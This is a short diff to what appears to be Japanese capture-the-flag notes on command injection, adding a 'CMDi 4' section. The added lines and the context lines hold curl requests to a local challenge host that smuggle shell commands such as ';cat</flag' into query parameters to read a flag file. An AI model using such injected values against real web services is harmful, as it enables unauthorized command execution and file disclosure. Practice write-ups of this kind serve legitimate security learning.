@@ -166,3 +166,9 @@ curl "http://challenge.localhost/event?top-path=%0acat</flag"
 #+begin_src shell
 curl "http://challenge.localhost/test?filedir=.';cat</flag'"
 #+end_src
+* CMDi 4
+最後の ~;~ を忘れずに。
+
+#+begin_src shell
+curl "http://challenge.localhost/event?time-zon=;cat</flag;"
+#+end_src
